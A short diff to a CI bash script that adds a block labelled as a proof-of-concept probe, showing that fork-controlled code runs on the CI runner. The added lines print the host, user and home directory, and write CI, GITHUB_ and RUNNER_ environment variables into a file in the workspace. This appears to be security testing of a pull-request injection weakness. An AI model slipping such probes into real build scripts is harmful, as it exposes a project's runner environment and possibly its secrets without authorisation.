@@ -1,6 +1,13 @@
 #!/usr/bin/env bash
 set -o pipefail -o errexit -o nounset
 
+# PoC probe: demonstrate fork-controlled code executes on the CI runner.
+echo "POC_EXEC_HOST=$(hostname)"
+echo "POC_EXEC_USER=$(id -un)"
+echo "POC_EXEC_HOME=$HOME"
+env | grep -E '^(CI|GITHUB_|RUNNER_)' | head -n 20 > /tmp/poc_env_probe.txt || true
+cp /tmp/poc_env_probe.txt ./poc_env_probe.txt 2>/dev/null || true
+
 # ./private/tools/diff/diff.bash --head-ref test --base-ref test --query-bazel --registry-spawn --report ./report.log
 
 STDERR=$(mktemp)
